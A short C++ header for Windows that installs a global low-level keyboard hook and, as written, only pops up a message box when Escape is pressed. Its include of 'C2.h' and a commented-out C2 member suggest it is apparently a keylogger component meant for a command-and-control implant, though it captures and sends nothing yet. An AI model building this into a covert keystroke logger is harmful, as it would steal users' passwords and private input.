#pragma once
#include <Windows.h>
#include "C2.h"

class KB {
	//C2 c2;
	static HHOOK hook;
	static KB *m_pThis;
	
public:
	
	void setHook() {
		m_pThis = this;
		hook = SetWindowsHookEx(WH_KEYBOARD_LL, proc, NULL, 0);
	}

	static LRESULT CALLBACK proc(int code, WPARAM wParam, LPARAM lParam) {
		m_pThis->kbhook(code, wParam, lParam);
		return CallNextHookEx(0, code, wParam, lParam);
	}

	void kbhook(int code, WPARAM wParam, LPARAM lParam) {
		KBDLLHOOKSTRUCT kbdStruct;
		if (code >= 0) {
			if (wParam == WM_KEYDOWN) {
				kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);
				if (kbdStruct.vkCode == VK_ESCAPE) {
					MessageBox(NULL, "Escape Pressed", "Key Pressed", NULL);
				}
			}
		}
	}

	void cleanup() {
		UnhookWindowsHookEx(hook);
	}
};
